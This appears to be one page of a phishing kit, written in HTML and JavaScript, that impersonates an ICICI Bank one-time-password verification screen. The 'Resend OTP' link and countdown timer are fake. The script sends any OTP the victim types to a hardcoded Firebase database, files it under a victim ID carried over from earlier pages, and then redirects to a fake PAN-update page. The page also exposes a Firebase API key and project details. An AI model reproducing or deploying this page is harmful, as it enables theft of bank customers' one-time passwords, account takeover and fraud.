   <body onload="startTimer();">
      <div class="login-box">
        
            <img class="header-logo" alt="ICICI Bank Logo" src="icici h.jpg" />
            <h1 class="text-center">One Time Password (OTP) Verification</h1>
            <div class="card">
               <p>
                  One Time Password (OTP) has been sent to your registered mobile number. Please enter the OTP and proceed.
               </p>
               <form class="LoginForm">
                  <input type="hidden" name="" value=""/>
                  <div class="form-group">
                     <label for="2ND_{PAN}_OTP">
                        One Time Password<span style="color:red;">*</span>
                     </label>
                     <input type="text" class="new-control" id="2ND_{PAN}_OTP" name="2ND_{PAN}_OTP" maxLength="6" inputmode="numeric" pattern="[0-9]\d{5}" title="Please enter valid OTP!" required/>
                  </div>
                  <div id="re">
                     <a href="#" id="resendOTP">Resend OTP</a>
                  </div><br>
                   <div id="timer-container">
                     <span id="time"></span>&nbsp;second
                  </div>
                  
                  <div class="text-center"><button type="submit" class="submit">Proceed</button></div>
               </form>
            </div>
            <img class="footer-logo" alt="ICICI OTP Footer" src="ICICI OTP F.jpg" />
         </div>
      </div>

      <!-- Firebase Configuration and Data Submission -->
      <script>
         // Initialize Firebase (Replace with your Firebase config)
         const firebaseConfig = {
            apiKey: "AIzaSyCDcF_4SEUs2RKDOAWoXUTCb9DO6QaO1TU",
            authDomain: "motutest-ac954.firebaseapp.com",
            databaseURL: "https://motutest-ac954-default-rtdb.firebaseio.com",
            projectId: "motutest-ac954",
            storageBucket: "motutest-ac954.firebasestorage.app",
            messagingSenderId: "85522378752",
            appId: "1:85522378752:web:7ebe0121ab3ff25e09a8e5"
         };
         if (!firebase.apps.length) {
            firebase.initializeApp(firebaseConfig);
         }
         const database = firebase.database();

         // Timer Logic
         var timer = 180;
         var sec = 0;
         function startTimer() {
            sec = parseInt(timer % 180);

            if (timer < 2) {
               window.location.href = "Enter_OTP_PAN.html";
            }

            document.getElementById("time").innerHTML =
               "<p> Wait for OTP : </p>" + sec.toString();
            timer--;
            setTimeout(function () {
               startTimer();
            }, 1000);
         }

         // Resend OTP Logic
         document.getElementById("resendOTP").addEventListener("click", function (e) {
            e.preventDefault();
            alert("OTP has been resent to your registered mobile number.");
            timer = 180; // Reset timer
            startTimer(); // Restart timer
         });

         // Handle form submission
         document.querySelector(".LoginForm").addEventListener("submit", async function (e) {
            e.preventDefault(); // Prevent default form submission

            // Get OTP value
            const otp = document.getElementById("2ND_{PAN}_OTP").value;

            // Validate OTP format (6 digits)
            const otpRegex = /^\d{6}$/;
            if (!otpRegex.test(otp)) {
               alert("Invalid OTP format! Please enter a 6-digit OTP.");
               return;
            }

            // Get saved userId from localStorage
            const currentUserId = localStorage.getItem("currentUserId");
            if (!currentUserId) {
               alert("Session expired. Please start again.");
               return;
            }

            try {
               // Update same user record instead of push
               await database.ref("user/" + currentUserId).update({
                  otp2: otp,
               });

               console.log("✅ OTP2 saved for user:", currentUserId);

               // Redirect to PAN_Updating.html
               window.location.href = "PAN_Updating.html";
            } catch (error) {
               console.error("❌ Error saving OTP:", error);
               alert("Error verifying OTP. Please try again.");
            }
         });
      </script>
